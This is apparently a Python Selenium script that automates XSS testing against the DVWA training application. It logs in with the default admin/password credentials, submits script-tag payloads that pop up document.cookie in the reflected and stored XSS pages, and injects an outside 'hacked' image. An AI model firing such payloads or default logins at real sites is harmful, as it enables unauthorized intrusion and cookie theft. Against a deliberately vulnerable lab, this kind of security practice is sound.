from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import Select
import time

def xssAuto(host):
	#Creating a text file to log
	file=open('xss.log', 'w')

	timeToSleep=1

	# create a new Firefox session
	driver = webdriver.Firefox()
	#driver.implicitly_wait(10)
	driver.maximize_window()
	 
	# navigate to the application home page
	driver.get(host+"/dvwa/login.php")
	 
	# get the search textbox
	username = driver.find_element_by_name("username")
	password=driver.find_element_by_name("password")
	 
	# enter search keyword and submit
	username.send_keys("admin")
	password.send_keys("password")
	login=driver.find_element_by_name("Login")
	time.sleep(timeToSleep)
	login.click()

	#REFLECTED XSS
	driver.get(host+"/dvwa/vulnerabilities/xss_r/")
	username = driver.find_element_by_name("name")
	
	#Attack 1 Get cookie
	time.sleep(timeToSleep)
	username.send_keys("<script> alert(document.cookie) </script>")
	time.sleep(timeToSleep)
	username.submit()

	time.sleep(timeToSleep+3)

	try:
		file.write("=============XSS found===========\n")
		file.write(driver.switch_to_alert().text+"\n")
		driver.switch_to_alert().accept()
	except:
		file.write("No XSS found\n")
	
	#Attack 2 Fake Image
	time.sleep(timeToSleep)
	driver.get(host+"/dvwa/vulnerabilities/xss_r/")
        username = driver.find_element_by_name("name")
	
	fakeHackImage='<img src="http://www.michellgroup.com/wp-content/uploads/2015/01/hacked-MCG.png" height="200" width="200">'
	
	time.sleep(timeToSleep)
	username.send_keys(fakeHackImage)
        time.sleep(timeToSleep)
        username.submit()
	#Just that the image the visible for 10 seconds, it takes time to load
	time.sleep(10)

	#STORED XSS
	driver.get(host+"/dvwa/vulnerabilities/xss_s/")

	#Handling if already a pop up appears, already a stored XSS is there
	try:
		driver.switch_to_alert().accept()
	except:
		print "Continue"	

	txtName = driver.find_element_by_name("txtName")
	mtxMessage = driver.find_element_by_name("mtxMessage")

	time.sleep(timeToSleep)
	txtName.send_keys("<script> alert(1) </script>")
	time.sleep(timeToSleep)
	mtxMessage.send_keys("<script> alert(document.cookie) </script>")
	time.sleep(timeToSleep)
	mtxMessage.submit()

	time.sleep(timeToSleep+2)
	driver.switch_to_alert().accept()

	file.close()

	#select = Select(driver.find_element_by_name('security'))
	#for item in select.options:
	#	print item.text
	#select.select_by_value('low');

	#print dir(select)



	#lala=driver.find_element_by_name("seclev_submit")
	#lala.click()

	#driver.find_element_by_xpath("//select/option[@value='low']").click()



	# iterate through each element and print the text that is
	# name of the search

	#el = driver.find_element_by_name("security")

	#for option in el.find_elements_by_tag_name('option'):
		#print dir(option)	
		#if option.text == 'low':
			#print "Low"
			#option.submit()
			#lala=driver.find_element_by_name("seclev_submit")
			#lala.click()
			#break
			#continue 
